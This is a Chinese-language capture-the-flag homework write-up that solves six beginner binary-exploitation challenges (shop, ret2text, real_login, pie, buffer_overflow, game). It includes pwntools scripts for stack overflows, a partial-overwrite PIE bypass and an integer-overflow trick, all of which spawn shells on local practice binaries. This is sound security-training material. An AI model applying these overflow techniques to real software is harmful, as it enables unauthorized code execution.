# 第一次课后作业

## shop
checksec一下

![](https://cdn.nlark.com/yuque/0/2025/png/52509818/1737623646436-03506212-0b46-45b5-b9d5-50896acca48e.png)

64位 开了很多保护

拖进ida分析

![](https://cdn.nlark.com/yuque/0/2025/png/52509818/1737624016635-41b5757a-962e-4deb-9d99-2f31a06147d9.png)

![](https://cdn.nlark.com/yuque/0/2025/png/52509818/1737624099416-5da92c2e-515f-443c-a741-63c447dd53d3.png)

看到提示，是一个整数溢出，那把钱变成负数
（买别的东西如果钱不够的话会提示无法购买，但是选项3会无条件扣款，所以钱低于50时选一个3）

![](https://cdn.nlark.com/yuque/0/2025/png/52509818/1737624503873-2989cab0-358f-4a07-9a07-4fd109df33cb.png)

我这里买了一次1两次2一次3，之后再去1购买shell即可

## ret2text

checksec一下

![](https://cdn.nlark.com/yuque/0/2025/png/52509818/1737624667282-e85985e6-a171-465c-a30a-dc8468d8ffc3.png)

64位，没开栈保护，没开pie保护

拖进ida

![](https://cdn.nlark.com/yuque/0/2025/png/52509818/1737624765128-4a90b6fc-fc26-4b84-aa25-3bced70a4f4d.png)

看到提示，找到非四级单词

![](https://cdn.nlark.com/yuque/0/2025/png/52509818/1737624842771-46c0dc13-58de-46de-a284-b5adb9042f1c.png)

找到后门函数

经典栈溢出，开始编写exp（64位注意栈对齐TnT）

```python
from pwn import *

io = process("./ret2text")

ret = 0x000000000040101a
address = 0x4014ba
padding = 0x40 + 8

payload = b'a' * padding + p64(ret) + p64(address)
io.sendline(payload)

io.interactive()
```
![](https://cdn.nlark.com/yuque/0/2025/png/52509818/1737625100599-4a5565db-3b27-4a77-ab0c-0e396708f264.png)
打通本地

## real_login

![](https://cdn.nlark.com/yuque/0/2025/png/52509818/1737625188879-faa8f997-f4cf-4678-92a0-41cdcde10e7f.png)

64位，开了一堆保护

拖进ida

![](https://cdn.nlark.com/yuque/0/2025/png/52509818/1737625273665-07a6f2f1-85f6-4f26-abd0-8df00d812194.png)

在func函数中看到输入password就可以打通，查看password

![](https://cdn.nlark.com/yuque/0/2025/png/52509818/1737625357697-4e0a2df9-2ca1-44b7-b825-1e7486cf23f1.png)

输入，打通

![](https://cdn.nlark.com/yuque/0/2025/png/52509818/1737625436312-41e4b724-f85e-46e7-a7c1-0082fac17c17.png)

## pie

![](https://cdn.nlark.com/yuque/0/2025/png/52509818/1737625508673-0cc42195-471b-4022-9077-98681720c6dc.png)

开了pie保护，地址是随机的（但是后三位地址不变）

拖进ida，发现存在栈溢出漏洞

![](https://cdn.nlark.com/yuque/0/2025/png/52509818/1737625749073-a201b5c7-bc0b-484a-acb2-c361818bff38.png)

找到后门函数以及地址

![](https://cdn.nlark.com/yuque/0/2025/png/52509818/1737626001926-248b7126-4c2a-4745-8b86-27ccf0e80593.png)

编写exp

```python
from pwn import *

io = process("./pie")

padding = 0x20 + 8

payload = b'a'*padding + b'\x6c'

io.sendline(payload)
io.interactive()
```
打通

![](https://cdn.nlark.com/yuque/0/2025/png/52509818/1737626164236-990c6e20-7ab3-4172-8730-fada3a2b0156.png)

## buffer_overflow

![](https://cdn.nlark.com/yuque/0/2025/png/52509818/1737626252447-b0c3f562-10fe-4d81-ac98-190c9dc53f5e.png)

64位，开了一堆保护

![](https://cdn.nlark.com/yuque/0/2025/png/52509818/1737626318841-a583bda9-3ed6-4cef-b07b-a678b132777c.png)

只要v5和ans一样就可以获取shell

但是v5无法靠输入修改，所以编写脚本把v5直接覆盖

exp：
```python
from pwn import *

io = process('./buffer_overflow')

payload = b'a'* 0x46 + b'Limiter and Wings are beautiful girls!'
io.send(payload)

io.interactive()
```
打通

![](https://cdn.nlark.com/yuque/0/2025/png/52509818/1737626563439-02347b83-21bb-4a45-b413-d433fcb65c9b.png)

## game

![](https://cdn.nlark.com/yuque/0/2025/png/52509818/1737626669413-fa2e4723-d05f-40df-b484-45486e3dae5c.png)

64位，没开栈保护

![](https://cdn.nlark.com/yuque/0/2025/png/52509818/1737626753325-0dc557c0-c402-4dd8-bb57-471deef6c5de.png)

发现v1累加到999就可以获取shell

编写脚本暴力发送直到v1达到999
```python
from pwn import *

io = process("./game")

i = 0
while i <= 999:
    io.sendlineafter(b'pls input you num:', b'9')
    i += 9

io.interactive()
```
打通

![](https://cdn.nlark.com/yuque/0/2025/png/52509818/1737626889726-977db26f-d640-4503-aa84-cdf4959f0c67.png)
